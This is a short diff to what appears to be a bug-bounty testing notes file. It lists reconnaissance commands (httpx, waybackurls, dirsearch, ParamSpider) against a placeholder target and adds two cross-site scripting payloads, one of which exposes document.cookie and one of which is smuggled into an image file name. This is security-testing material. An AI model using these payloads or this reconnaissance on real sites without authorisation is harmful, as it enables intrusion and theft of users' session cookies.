@@ -101,6 +101,8 @@ cat Starget.txt | httpx -status-code
 cat Starget.txt | httpx >> 1live.txt
 cat Ptarget.txt | httpx >> 2live.txt
 
+<img src=x onerror​=prompt(document.cookie)> “><img src=x onerror​=alert(1)>.jpg
+
 waybackurls target.com >> WB-target.com.txt
 dirsearch -u https://target.com >> DS-target.com.txt
 Parampsider -l alld.com.txt
